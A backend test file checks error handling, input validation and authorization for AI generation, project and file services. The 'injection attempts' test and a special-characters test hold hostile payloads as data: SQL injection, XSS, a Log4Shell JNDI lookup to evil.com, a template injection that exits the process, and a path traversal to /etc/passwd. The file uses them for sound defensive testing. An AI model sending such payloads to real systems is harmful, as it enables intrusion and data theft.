import { describe, it, expect, beforeEach, vi } from "vitest";
import { generate } from "../ai/ai";
import { create } from "../project/project";
import { createFile } from "../filesystem/filesystem";

// Mock the auth module
const mockAuth = {
  userID: "test-user-123",
  email: "test@example.com"
};

vi.mock("~encore/auth", () => ({
  getAuthData: vi.fn(() => mockAuth)
}));

// Mock the database module
const mockDb = {
  queryRow: vi.fn(),
  exec: vi.fn(),
  begin: vi.fn(),
};

vi.mock("../db", () => ({
  default: mockDb
}));

// Mock fetch globally
const mockFetch = vi.fn();
global.fetch = mockFetch;

describe("Backend Negative Path Tests", () => {
  beforeEach(() => {
    vi.clearAllMocks();
    process.env.AI_ENGINE_URL = "http://test-ai-engine:8001";
  });

  describe("AI Service Error Handling", () => {
    it("should handle network timeouts", async () => {
      mockDb.queryRow.mockResolvedValue({ id: "project-123" });
      
      // Mock timeout by never resolving
      mockFetch.mockImplementation(() => 
        new Promise((resolve, reject) => {
          setTimeout(() => reject({ name: 'AbortError' }), 100);
        })
      );

      const req = {
        prompt: "test prompt",
        projectId: "project-123"
      };

      await expect(generate(req)).rejects.toThrow("Request timeout");
    });

    it("should handle malformed AI Engine responses", async () => {
      mockDb.queryRow.mockResolvedValue({ id: "project-123" });
      mockDb.exec.mockResolvedValue(undefined);
      
      // Return malformed JSON
      mockFetch.mockResolvedValue({
        ok: true,
        json: async () => {
          throw new Error("Invalid JSON");
        }
      });

      const req = {
        prompt: "test prompt",
        projectId: "project-123"
      };

      await expect(generate(req)).rejects.toThrow("AI service temporarily unavailable");
    });

    it("should handle missing AI Engine response data", async () => {
      mockDb.queryRow.mockResolvedValue({ id: "project-123" });
      mockDb.exec.mockResolvedValue(undefined);
      
      // Return response without expected fields
      mockFetch.mockResolvedValue({
        ok: true,
        json: async () => ({
          // Missing choices array
          usage: { prompt_tokens: 10 }
        })
      });

      const req = {
        prompt: "test prompt",
        projectId: "project-123"
      };

      const result = await generate(req);
      expect(result.content).toBe("No response from AI");
    });

    it("should handle database connection errors during logging", async () => {
      mockDb.queryRow.mockResolvedValue({ id: "project-123" });
      mockDb.exec.mockRejectedValue(new Error("Database connection lost"));
      
      mockFetch.mockResolvedValue({
        ok: true,
        json: async () => ({
          choices: [{ message: { content: "Test response" } }],
          usage: { prompt_tokens: 10, completion_tokens: 20, total_tokens: 30 }
        })
      });

      const req = {
        prompt: "test prompt",
        projectId: "project-123"
      };

      // Should still return response even if logging fails
      const result = await generate(req);
      expect(result.content).toBe("Test response");
    });

    it("should handle rate limiting with exponential backoff simulation", async () => {
      mockDb.queryRow.mockResolvedValue({ id: "project-123" });
      
      let callCount = 0;
      mockFetch.mockImplementation(() => {
        callCount++;
        if (callCount <= 2) {
          return Promise.resolve({
            ok: false,
            status: 429,
            json: async () => ({ error: "Rate limited" })
          });
        }
        return Promise.resolve({
          ok: true,
          json: async () => ({
            choices: [{ message: { content: "Success after retry" } }],
            usage: { prompt_tokens: 10, completion_tokens: 20, total_tokens: 30 }
          })
        });
      });

      const req = {
        prompt: "test prompt",
        projectId: "project-123"
      };

      await expect(generate(req)).rejects.toThrow("Rate limit exceeded");
    });

    it("should handle concurrent request load", async () => {
      mockDb.queryRow.mockResolvedValue({ id: "project-123" });
      mockDb.exec.mockResolvedValue(undefined);
      
      let requestCount = 0;
      mockFetch.mockImplementation(() => {
        requestCount++;
        if (requestCount > 5) {
          return Promise.resolve({
            ok: false,
            status: 503,
            json: async () => ({ error: "Service overloaded" })
          });
        }
        return Promise.resolve({
          ok: true,
          json: async () => ({
            choices: [{ message: { content: `Response ${requestCount}` } }],
            usage: { prompt_tokens: 10, completion_tokens: 20, total_tokens: 30 }
          })
        });
      });

      const requests = Array.from({ length: 10 }, (_, i) => 
        generate({
          prompt: `concurrent request ${i}`,
          projectId: "project-123"
        }).catch(e => e)
      );

      const results = await Promise.all(requests);
      
      // Some should succeed, some should fail with overload
      const successes = results.filter(r => r.content);
      const failures = results.filter(r => r instanceof Error);
      
      expect(successes.length).toBeGreaterThan(0);
      expect(failures.length).toBeGreaterThan(0);
    });
  });

  describe("Project Service Edge Cases", () => {
    it("should handle database constraint violations", async () => {
      mockDb.exec.mockResolvedValue(undefined); // user upsert
      mockDb.queryRow.mockRejectedValue(new Error("UNIQUE constraint violation"));

      const req = {
        name: "Duplicate Project",
        description: "This should cause a constraint error"
      };

      await expect(create(req)).rejects.toThrow("UNIQUE constraint violation");
    });

    it("should handle extremely long project names", async () => {
      const req = {
        name: "a".repeat(1000), // Much longer than allowed
        description: "Test project"
      };

      await expect(create(req)).rejects.toThrow("Project name too long");
    });

    it("should handle special characters in project data", async () => {
      mockDb.exec.mockResolvedValue(undefined);
      mockDb.queryRow.mockResolvedValue({ id: "project-123" });

      const req = {
        name: "Test Project with émojis 🚀 and SQL'; DROP TABLE--",
        description: "Description with <script>alert('xss')</script>"
      };

      const result = await create(req);
      
      // Should sanitize and handle safely
      expect(result.name).toContain("émojis");
      expect(result.name).not.toContain("DROP TABLE");
    });

    it("should handle database transaction failures", async () => {
      mockDb.exec.mockResolvedValue(undefined);
      mockDb.queryRow.mockResolvedValue({ id: "project-123" });
      
      // Mock file creation to fail (simulate complex transaction)
      vi.doMock("../filesystem/filesystem", () => ({
        createFile: vi.fn().mockRejectedValue(new Error("File system error"))
      }));

      const req = {
        name: "Test Project",
        template: "react-typescript"
      };

      // Should still create project even if initial files fail
      const result = await create(req);
      expect(result.name).toBe("Test Project");
    });
  });

  describe("Filesystem Service Error Scenarios", () => {
    it("should handle concurrent file operations", async () => {
      mockDb.queryRow
        .mockResolvedValue({ id: "project-123" }) // project access
        .mockResolvedValue(null) // file doesn't exist
        .mockResolvedValue(null) // no parent directory
        .mockResolvedValue({ id: "file-123" }); // created file

      const requests = Array.from({ length: 5 }, (_, i) => 
        createFile({
          projectId: "project-123",
          path: `/concurrent-${i}.txt`,
          type: "file",
          content: `Content ${i}`
        }).catch(e => e)
      );

      const results = await Promise.all(requests);
      
      // Some should succeed, handle race conditions gracefully
      const successes = results.filter(r => r.id);
      expect(successes.length).toBeGreaterThan(0);
    });

    it("should handle filesystem permission errors", async () => {
      mockDb.queryRow
        .mockResolvedValue({ id: "project-123" }) // project access
        .mockResolvedValue(null) // file doesn't exist
        .mockRejectedValue(new Error("Permission denied"));

      const req = {
        projectId: "project-123",
        path: "/protected/file.txt",
        type: "file" as const,
        content: "test content"
      };

      await expect(createFile(req)).rejects.toThrow("Permission denied");
    });

    it("should handle disk space exhaustion", async () => {
      mockDb.queryRow
        .mockResolvedValue({ id: "project-123" }) // project access
        .mockResolvedValue(null) // file doesn't exist
        .mockRejectedValue(new Error("No space left on device"));

      const req = {
        projectId: "project-123",
        path: "/large-file.txt",
        type: "file" as const,
        content: "x".repeat(1024 * 1024) // 1MB content
      };

      await expect(createFile(req)).rejects.toThrow("No space left on device");
    });

    it("should handle binary file content", async () => {
      mockDb.queryRow
        .mockResolvedValue({ id: "project-123" }) // project access
        .mockResolvedValue(null) // file doesn't exist
        .mockResolvedValue(null) // no parent directory
        .mockResolvedValue({ id: "file-123" }); // created file

      const binaryContent = Buffer.from([0x89, 0x50, 0x4E, 0x47]).toString('base64');

      const req = {
        projectId: "project-123",
        path: "/image.png",
        type: "file" as const,
        content: binaryContent
      };

      const result = await createFile(req);
      expect(result.content).toBe(binaryContent);
    });
  });

  describe("Authentication and Authorization Edge Cases", () => {
    it("should handle missing authentication", async () => {
      // Mock auth to return null
      vi.mocked(vi.doMock("~encore/auth", () => ({
        getAuthData: vi.fn(() => null)
      })));

      const req = {
        prompt: "test prompt"
      };

      await expect(generate(req)).rejects.toThrow("Authentication required");
    });

    it("should handle malformed auth tokens", async () => {
      // Mock auth with malformed data
      vi.mocked(vi.doMock("~encore/auth", () => ({
        getAuthData: vi.fn(() => ({
          userID: null, // Invalid user ID
          email: "invalid"
        }))
      })));

      const req = {
        prompt: "test prompt"
      };

      // Should handle gracefully or reject appropriately
      await expect(generate(req)).rejects.toThrow();
    });

    it("should handle authorization bypass attempts", async () => {
      mockDb.queryRow.mockResolvedValue(null); // No project access

      const req = {
        prompt: "test prompt",
        projectId: "other-users-project"
      };

      await expect(generate(req)).rejects.toThrow("Access denied to this project");
    });
  });

  describe("Input Validation Edge Cases", () => {
    it("should handle null and undefined inputs", async () => {
      const invalidRequests = [
        { prompt: null },
        { prompt: undefined },
        { prompt: "" },
        { prompt: "   " }, // Only whitespace
      ];

      for (const req of invalidRequests) {
        await expect(generate(req as any)).rejects.toThrow();
      }
    });

    it("should handle extremely large payloads", async () => {
      const req = {
        prompt: "x".repeat(100000), // 100KB prompt
        projectId: "project-123"
      };

      await expect(generate(req)).rejects.toThrow("Prompt too long");
    });

    it("should handle injection attempts", async () => {
      const maliciousPrompts = [
        "'; DROP TABLE users; --",
        "<script>alert('xss')</script>",
        "${jndi:ldap://evil.com/a}",
        "{{constructor.constructor('return process')().exit()}}",
        "../../../etc/passwd"
      ];

      for (const prompt of maliciousPrompts) {
        mockDb.queryRow.mockResolvedValue({ id: "project-123" });
        mockDb.exec.mockResolvedValue(undefined);
        
        mockFetch.mockResolvedValue({
          ok: true,
          json: async () => ({
            choices: [{ message: { content: "Safe response" } }],
            usage: { prompt_tokens: 10, completion_tokens: 20, total_tokens: 30 }
          })
        });

        const req = { prompt, projectId: "project-123" };
        const result = await generate(req);
        
        // Should handle safely without executing malicious content
        expect(result.content).toBe("Safe response");
      }
    });
  });

  describe("Resource Exhaustion Tests", () => {
    it("should handle memory pressure", async () => {
      // Simulate memory pressure by creating large objects
      const largeData = Array(1000).fill("x".repeat(1000));
      
      mockDb.queryRow.mockResolvedValue({ id: "project-123" });
      mockDb.exec.mockResolvedValue(undefined);
      
      mockFetch.mockResolvedValue({
        ok: true,
        json: async () => ({
          choices: [{ message: { content: "Response under memory pressure" } }],
          usage: { prompt_tokens: 10, completion_tokens: 20, total_tokens: 30 }
        })
      });

      const req = {
        prompt: "test prompt",
        projectId: "project-123",
        context: largeData.join(" ")
      };

      // Should handle without crashing
      const result = await generate(req);
      expect(result.content).toBe("Response under memory pressure");
    });

    it("should handle database connection pool exhaustion", async () => {
      // Mock database to simulate connection exhaustion
      let connectionCount = 0;
      mockDb.queryRow.mockImplementation(() => {
        connectionCount++;
        if (connectionCount > 3) {
          throw new Error("Connection pool exhausted");
        }
        return Promise.resolve({ id: "project-123" });
      });

      const requests = Array.from({ length: 5 }, (_, i) => 
        generate({
          prompt: `request ${i}`,
          projectId: "project-123"
        }).catch(e => e)
      );

      const results = await Promise.all(requests);
      
      // Some should fail with connection errors
      const connectionErrors = results.filter(r => 
        r instanceof Error && r.message.includes("Connection pool exhausted")
      );
      expect(connectionErrors.length).toBeGreaterThan(0);
    });
  });
});